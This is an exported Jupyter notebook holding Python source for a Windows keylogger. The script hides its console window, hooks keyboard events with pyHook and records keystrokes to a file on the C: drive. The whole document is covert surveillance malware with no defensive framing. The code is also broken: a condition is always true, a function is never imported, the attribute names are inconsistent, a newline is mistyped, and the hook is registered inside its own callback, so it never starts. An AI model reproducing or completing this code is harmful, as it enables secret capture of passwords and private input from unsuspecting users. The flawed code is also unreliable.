
# coding: utf-8

# In[9]:

import win32api
import win32gui
import win32console
import pyHook
import pythoncom


# In[10]:

show = win32console.GetConsoleWindow()
win32gui.ShowWindow(show,0)


# In[ ]:

def OnKeyboardEvent(event):
    if event.ascii==5:
        _exit(1)
    
    if event.ascii !=0 or 8:
        s=open('c:\output.txt','r')
        buffer=s.read()
        s.close()
        s=open('c:\output.txt','w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='/n'
            buffer += keylogs
            s.write(buffer)
            s.close()
    
    hook=pyHook.HookManager()
    hook.KeyDown = OnKeyboardEvent
    hook.HookKeyboard()
    pythoncom.PumpMessages()


# In[ ]:



